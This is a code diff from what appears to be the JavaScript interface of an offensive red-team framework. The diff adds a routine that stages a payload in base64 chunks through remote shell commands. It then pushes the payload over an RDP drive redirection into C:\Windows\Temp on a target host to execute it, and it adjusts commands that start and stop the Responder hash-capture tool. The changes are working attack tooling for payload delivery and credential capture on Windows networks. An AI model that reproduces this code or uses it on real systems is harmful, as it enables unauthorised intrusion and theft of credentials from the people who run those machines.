+  const lbin = lbinFile ? (localPayload?.path || `payloads/${lbinFile}`) : '';
   const defaultRpath = lbinFile ? `C:\\Windows\\Temp\\${lbinFile}` : 'C:\\Windows\\Temp\\agent.exe';
   const rpath = document.getElementById('ipc-rpath').value.trim() || defaultRpath;
   const surl  = document.getElementById('ipc-surl').value.trim();
@@ -18375,8 +18539,10 @@ async function ipcRun(action) {
       // timeout /t 5 gives the virtual channel time to establish before exec.
       // Bash double-quote: \\\\→\\ and \\→\ → \\tsclient\upload\file.exe reaches xfreerdp.
       if (!lbin) { toast('Select a payload', 'error'); return; }
-      const lbinBase = lbinFile.includes('/') ? lbinFile.split('/').pop() : lbinFile;
-      const lbinDir  = `$(dirname "$(realpath "payloads/${lbinFile}")")`;
+      const lbinBase = localPayload?.name || (lbinFile.includes('/') ? lbinFile.split('/').pop() : lbinFile);
+      const lbinDir  = localPayload
+        ? localPayload.dir
+        : `$(dirname "$(realpath "payloads/${lbinFile}")")`;
       cmds.push(
         `${rdpBase}` +
         ` /drive:upload,${lbinDir}` +
@@ -18497,7 +18663,11 @@ async function ipcRun(action) {
     }
   }
 
-  if (!cmds.length) { toast('Method not supported', 'error'); return; }
+  if (!cmds.length) {
+    if (localPayload) _execOneshot(`rm -rf -- ${shellQuote(localPayload.dir)}`).catch(()=>{});
+    toast('Method not supported', 'error');
+    return;
+  }
 
   const outEl = document.getElementById('ipc-run-output');
   outEl.style.display = 'block';
@@ -18550,6 +18720,7 @@ async function ipcRun(action) {
   }
   _ipcSetRunning(false);
   _ipcRunAbort = null;
+  if (localPayload) _execOneshot(`rm -rf -- ${shellQuote(localPayload.dir)}`).catch(()=>{});
   outEl.scrollTop = outEl.scrollHeight;
 }
 
@@ -18584,12 +18755,44 @@ async function _execOneshot(cmd) {
     headers: {'Content-Type':'application/json','Authorization':'Bearer '+tok},
     body: JSON.stringify({cmd}),
   });
+  if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
   const text = await resp.text();
   // Each SSE frame is "data: <line>\n\n"; strip prefix, skip control events (exit code, done)
   return text.split('\n')
     .filter(l => l.startsWith('data:') && !l.includes('[done]') && !l.match(/^data:\s*\d+$/))
     .map(l => l.slice(5).trimStart())
     .join('\n');
+}
+
+function shellQuote(value) {
+  return "'" + String(value).replace(/'/g, "'\\''") + "'";
+}
+
+async function ipcStageLocalPayload(filename) {
+  const bytes = await fetchSCFile(filename);
+  const base = (String(filename).split(/[\\/]/).pop() || 'payload.bin')
+    .replace(/[^A-Za-z0-9._-]/g, '_');
+  const nonce = `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
+  const dir = `/tmp/endgame-ipc-${nonce}`;
+  const path = `${dir}/${base}`;
+  const b64 = u8ToB64(bytes);
+  const chunkSize = 49152; // divisible by four, so every chunk is valid base64
+  const marker = '__ENDGAME_PAYLOAD_OK__';
+
+  for (let i = 0; i < b64.length; i += chunkSize) {
+    const chunk = b64.slice(i, i + chunkSize);
+    const first = i === 0;
+    const last = i + chunk.length >= b64.length;
+    let command = first
+      ? `umask 077 && mkdir -p ${shellQuote(dir)} && chmod 700 ${shellQuote(dir)} && printf '%s' '${chunk}' | base64 -d > ${shellQuote(path)}`
+      : `printf '%s' '${chunk}' | base64 -d >> ${shellQuote(path)}`;
+    if (last) command += ` && chmod 700 ${shellQuote(path)} && printf '%s\\n' ${marker}`;
+    const output = await _execOneshot(command);
+    if (last && !output.includes(marker)) {
+      throw new Error('falló la escritura local del payload');
+    }
+  }
+  return {dir, path, name: base};
 }
 
 async function respStart() {
@@ -18645,7 +18848,9 @@ async function respStart() {
 function respStop() {
   if (_respAbort) { _respAbort.abort(); _respAbort = null; }
   if (_respPollTimer) { clearInterval(_respPollTimer); _respPollTimer = null; }
-  _execOneshot('sudo pkill -x Responder 2>/dev/null; true').catch(()=>{});
+  // Linux process names are case-sensitive; the start command uses lowercase
+  // `responder`, while some installations expose `Responder`/`Responder.py`.
+  _execOneshot("sudo pkill -x responder 2>/dev/null; sudo pkill -x Responder 2>/dev/null; sudo pkill -f '[Rr]esponder' 2>/dev/null; true").catch(()=>{});
   document.getElementById('resp-btn-start').style.display = '';
   document.getElementById('resp-btn-stop').style.display  = 'none';
   setTimeout(respRefreshHashes, 1200);
